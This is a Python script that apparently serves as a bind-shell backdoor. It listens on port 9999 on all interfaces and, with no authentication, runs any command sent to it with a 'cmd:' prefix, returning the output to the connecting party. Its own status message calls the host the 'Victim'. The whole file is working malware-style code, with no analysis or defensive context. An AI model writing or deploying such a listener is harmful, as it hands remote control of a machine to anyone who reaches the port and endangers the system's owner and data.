import socket
import subprocess

HOST = '0.0.0.0'  # Accept from any IP
PORT = 9999

def handle_client(conn, addr):
    print(f"[+] Connected by {addr}")
    while True:
        try:
            data = conn.recv(1024).decode()
            if not data:
                print(f"[-] Disconnected: {addr}")
                break

            print(f"[COMMAND] Received: {data}")

            if data.startswith("msg:"):
                msg = data[4:]
                print("[MESSAGE]", msg)
                response = "Displayed"
            elif data.startswith("cmd:"):
                cmd = data[4:]
                try:
                    result = subprocess.getoutput(cmd)
                    response = result
                except Exception as e:
                    response = f"[!] Error: {e}"
            else:
                response = "[!] Unknown command format"

            conn.sendall(response.encode())

        except Exception as e:
            print(f"[!] Error handling client: {e}")
            break

    conn.close()

# Main server loop
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((HOST, PORT))
    s.listen()
    print("[*] Victim waiting for connection...")

    while True:
        conn, addr = s.accept()
        handle_client(conn, addr)
